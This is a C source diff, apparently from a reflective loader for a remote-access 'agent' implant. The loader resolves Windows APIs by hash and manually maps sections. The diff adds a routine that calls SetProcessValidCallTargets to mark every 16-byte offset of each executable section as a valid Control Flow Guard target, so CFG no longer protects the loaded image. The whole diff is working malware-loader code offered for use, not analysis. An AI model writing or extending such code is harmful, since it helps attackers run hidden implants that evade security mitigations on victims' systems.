@@ -105,6 +105,65 @@ void LdrProcessIAT(PVOID Base, PBYTE Raw) {
     }
 }
 
+typedef struct _CFG_TARGET_INFO {
+    ULONG_PTR Offset;
+    ULONG_PTR Flags;
+} CFG_TARGET_INFO;
+
+#define CFG_CALL_TARGET_VALID 0x00000001
+
+static void LdrMarkCfgValid(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections) {
+    DBGA("[*] CFG: resolving SetProcessValidCallTargets\n");
+
+    HMODULE kbase = GetModule(HASHED_kernelbase);
+    if (!kbase) {
+        DBGA("[!] CFG: no kernelbase\n");
+        return;
+    }
+
+    typedef BOOL (WINAPI *fnSetProcessValidCallTargets)(HANDLE, PVOID, SIZE_T, ULONG, CFG_TARGET_INFO *);
+    fnSetProcessValidCallTargets pSet = (fnSetProcessValidCallTargets)GetProc(kbase, HASHED_SetProcessValidCallTargets);
+    if (!pSet) {
+        DBGA("[!] CFG: no SetProcessValidCallTargets\n");
+        return;
+    }
+
+    for (DWORD i = 0; i < numSections; i++) {
+        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
+            continue;
+
+        SIZE_T vsize = sec[i].Misc.VirtualSize;
+        if (!vsize)
+            continue;
+
+        PVOID base = (PBYTE)Base + sec[i].VirtualAddress;
+        CFG_TARGET_INFO *info = ldr->win32->LocalAlloc(LMEM_FIXED, 256 * sizeof(CFG_TARGET_INFO));
+        if (!info)
+            continue;
+
+        for (SIZE_T off = 0; off < vsize; off += 256 * 16) {
+            ULONG n = 0;
+            for (SIZE_T o = off; o < vsize && n < 256; o += 16) {
+                info[n].Offset = o;
+                info[n].Flags  = CFG_CALL_TARGET_VALID;
+                n++;
+            }
+            BOOL ok = pSet(CurrentProcess(), base, vsize, n, info);
+            DBGA(ok ? "[*] CFG: section marked\n" : "[!] CFG: section FAILED\n");
+        }
+
+        ldr->win32->LocalFree(info);
+    }
+}
+
+void LdrMarkCfgValidImage(PVOID Base) {
+    if (!Base)
+        return;
+    DBGA("[*] CFG: marking agent image\n");
+    LdrMarkCfgValid(Base, SECTION_HEADER(Base), FILE_HEADER(Base)->NumberOfSections);
+    DBGA("[*] CFG: agent image done\n");
+}
+
 void LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections) {
 	DBGA("[+] Handling Section perms\n");
 
@@ -116,6 +175,8 @@ void LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections)
         DWORD prot = SectionCharsToProt(sec[i].Characteristics);
         ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &secMemory, &secSize, prot, &old);
     }
+
+    LdrMarkCfgValid(Base, sec, numSections);
 
     ldr->win32->NtFlushInstructionCache(CurrentProcess(), NULL, 0);
 }
